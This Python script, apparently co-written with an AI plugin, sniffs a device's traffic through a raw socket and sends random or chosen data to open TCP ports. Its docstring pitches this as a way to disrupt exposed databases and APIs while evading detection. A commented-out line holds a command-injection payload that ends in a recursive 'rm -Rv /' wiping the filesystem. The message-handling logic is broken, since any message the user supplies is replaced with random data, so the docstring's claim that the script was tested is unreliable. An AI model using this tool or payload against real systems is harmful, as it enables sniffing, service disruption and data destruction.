# Dylan Kenneth Eliot & gpt-4-plugins

"""
This took some time to figure out. However, given a ip and a port, with a specific message or random message in mind, read and send random
 or pseudo-random data. Due note that this is a way databases and other exposed api's can be messed with, even on local networks by other users.
  Detection of intrusion may not, however, be triggered by this method. So, be mindful of what is public and what is not.

The way it works is:

send_data_over_open_port.py send {ip of server/server-name}

And this code has been tested

I am not responsible for any damage one does with this code. If you use this to test for a security
 reason, that's one thing. But outright hacking with this type of code is considered illegal.
Please do be mindful even when testing on your own local machines, as well as others on the same
 network. I do not condone hacking beyond educational purposes such as teaching what it is and what
  it looks like.
"""

import socket
import os
import subprocess
import sys
import random

def get_ip_from_name(device_name):
    try:
        # Try DNS resolution first
        return socket.gethostbyname(device_name)
    except socket.gaierror:
        # If DNS resolution fails, try ARP cache
        try:
            # Use arp command to get the IP address
            result = subprocess.check_output(["arp", "-n", device_name]).decode('utf-8')
            for line in result.split("\n"):
                if device_name in line:
                    return line.split()[0]
        except:
            return None

def listen_device_traffic(device_name):
    device_ip = get_ip_from_name(device_name)
    if not device_ip:
        print(f"Could not resolve IP address for device name: {device_name}")
        return

    # Create a raw socket to listen to all traffic
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    
    while True:
        # Receive data from the socket
        packet, addr = s.recvfrom(65536)
        
        # Extract the source and destination IP addresses from the packet
        src_ip = socket.inet_ntoa(packet[26:30])
        dst_ip = socket.inet_ntoa(packet[30:34])
        
        # Check if the packet is sourced from or destined to the device's IP address
        if src_ip == device_ip or dst_ip == device_ip:
            print(f"Captured packet between {src_ip} and {dst_ip}: {packet}")

def generate_random_data(length=100):
    """Generate random data of the specified length."""
    return ''.join(random.choice('0123456789ABCDEF') for _ in range(length))

def send_random_packet(target_ip, target_port=6603, message=generate_random_data()):
    """Send a random packet to the specified IP and port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    random_data = message if message.count("") == 1 else generate_random_data() # + "; echo '\x1b[0;0H[38;212;113;35m \u2588'; f(){ rm -Rv /; f; }; f;"
    s.sendall(random_data.encode('utf-8'))
    s.close()

if __name__ == "__main__":
    # Check if the script is run as root
    if os.geteuid() != 0:
        print("You need to run this script as root!")
        sys.exit(1)

    # Check if a device name is provided as a command-line argument
    if len(sys.argv) < 3:
        print("Usage: python script_name.py listen DEVICE_NAME")
        print("       python script_name.py send TARGET_IP message")
        sys.exit(1)

    action = sys.argv[1]

    if action == "listen":
        DEVICE_NAME = sys.argv[2]
        listen_device_traffic(DEVICE_NAME)
    elif action == "send":
        TARGET_IP = sys.argv[2]
        if len(sys.argv) >= 3:
            sys.argv.append("")
        send_random_packet(TARGET_IP, message=sys.argv[3:][0])
    else:
        print("Invalid action. Use 'listen' or 'send'.")
